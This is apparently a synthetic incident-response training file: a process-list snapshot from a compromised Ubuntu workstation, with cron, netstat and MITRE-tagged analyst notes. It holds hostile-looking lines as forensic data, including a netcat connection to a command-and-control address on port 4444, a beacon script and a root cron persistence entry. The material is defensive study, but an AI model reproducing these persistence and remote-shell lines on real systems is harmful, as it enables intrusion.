@@ -1,0 +1,46 @@
+================================================================================
+SYNTHETIC TRAINING ARTEFACT – Process list snapshot from employee-ws
+Captured via Velociraptor VQL: SELECT * FROM pslist()
+Capture time: 2026-06-08T02:14:05.000Z (during active compromise)
+Host: employee-ws (10.10.30.10) | OS: Ubuntu 22.04 LTS
+================================================================================
+
+PID   PPID  NAME               USERNAME   CPU%  MEM_MB  EXE
+1     0     systemd            root       0.0   12.4    /usr/lib/systemd/systemd
+2     1     kthreadd           root       0.0   0.0     [kthread]
+125   1     systemd-journald   root       0.1   18.2    /usr/lib/systemd/systemd-journald
+312   1     cron               root       0.0   3.1     /usr/sbin/cron
+314   1     sshd               root       0.0   5.4     /usr/sbin/sshd
+400   314   sshd               analyst    0.0   6.1     /usr/sbin/sshd
+401   400   bash               analyst    0.0   4.8     /usr/bin/bash
+512   1     wazuh-agentd       wazuh      0.2   22.7    /var/ossec/bin/wazuh-agentd
+601   1     cron               root       0.0   3.2     /usr/sbin/cron
+---
+<<< SUSPICIOUS ENTRIES BELOW >>>
+---
+711   312   bash               root       0.8   8.4     /bin/bash /tmp/.svc_update
+712   711   nc                 root       1.2   2.1     /usr/bin/nc 10.10.20.20 4444
+713   1     beacon.sh          root       0.1   1.8     /bin/bash /opt/c2-beacon/beacon.sh
+---
+<<< END SUSPICIOUS ENTRIES >>>
+---
+800   1     apache2            www-data   0.3   48.2    /usr/sbin/apache2
+901   1     mysql              mysql      0.5   214.6   /usr/sbin/mysqld
+1024  1     rsyslogd           syslog     0.0   6.8     /usr/sbin/rsyslogd
+1100  1     NetworkManager     root       0.0   9.4     /usr/sbin/NetworkManager
+9999  1     [crypto-worker]    root       99.8  312.4   /tmp/.svc_update [DORMANT DROPPER STUB]
+
+CRON ENTRIES AT TIME OF CAPTURE:
+/etc/cron.d/svc-update:
+  */5 * * * * root /tmp/.svc_update >> /tmp/.svc_update.log 2>&1
+
+OPEN NETWORK CONNECTIONS (netstat excerpt):
+  tcp  0  0  10.10.30.10:49231  10.10.20.20:4444   ESTABLISHED  pid=712
+  tcp  0  0  10.10.30.10:49232  10.10.20.20:4444   TIME_WAIT
+
+NOTES FOR ANALYSIS:
+  - PID 712 (nc): active connection to C2 IP 10.10.20.20:4444 — MITRE T1071.001
+  - PID 713 (beacon.sh): persistence beacon script — MITRE T1059.004
+  - PID 9999 (/tmp/.svc_update): dropper stub — MITRE T1059.004
+  - /etc/cron.d/svc-update: scheduled task persistence — MITRE T1053.005
+  - Hash of /tmp/.svc_update: MD5=aabbccdd11223344aabbccdd11223344 (matches MISP Event #1001)
